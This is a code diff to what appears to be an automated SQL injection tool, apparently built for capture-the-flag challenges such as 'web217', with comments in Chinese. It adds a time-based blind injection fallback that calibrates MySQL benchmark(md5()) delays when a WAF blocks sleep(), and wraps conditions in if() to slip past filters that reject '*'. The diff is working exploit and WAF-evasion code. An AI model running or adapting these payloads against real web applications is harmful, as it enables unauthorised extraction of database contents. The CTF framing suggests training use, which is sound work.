@@ -543,12 +543,29 @@ class TimeOracle(BaseOracle):
             r = self.s.request_value(self.b.wrap(fn(f"sleep({delay})")))
             if r.elapsed_ms >= self.delay * 1000 * 0.75:
                 return
+        # sleep 不可用（web217 类 waf 专门拦 sleep）→ benchmark 校准模式
+        if not self.waf.is_filtered("benchmark"):
+            probe = "benchmark(300000,md5(0x616263))"
+            r = self.s.request_value(self.b.wrap(self.b.logic_or(probe)))
+            if r.elapsed_ms >= 250:
+                got = max(r.elapsed_ms / 1000.0, 0.01)
+                self.bench_kicks = max(1, int(300000 * self.delay / got))
+                self.mode = "benchmark"
+                self._joiner = "or"     # 校准用 or 验证，eval 也必须用 or
+                self.s.log("INFO", f"[time] sleep 不可用，benchmark 模式"
+                                   f"（校准 {got:.2f}s@3e5 → K={self.bench_kicks}）")
+                return
         if not self.waf.is_filtered("if"):
             raise OracleError("or/and/xor 均无法触发延时，时间通道不可用")
 
     def eval_bool(self, cond: str) -> bool:
         join = getattr(self.b, f"logic_{self._joiner}")
-        if not self.waf.is_filtered("if"):
+        if getattr(self, "mode", "") == "benchmark":
+            # 不能用 K*(cond)——web217 类隐藏 waf 拒 *（整包秒拒）；
+            # if() 三元把条件翻译成「跑不跑 benchmark」
+            core = self.b.logic_or(
+                f"if(({cond}),benchmark({self.bench_kicks},md5(0x616263)),0)")
+        elif not self.waf.is_filtered("if"):
             core = join(f"if(({cond}),sleep({self.delay}),0)")
         else:
             core = join(f"sleep({self.delay}*({cond}))")
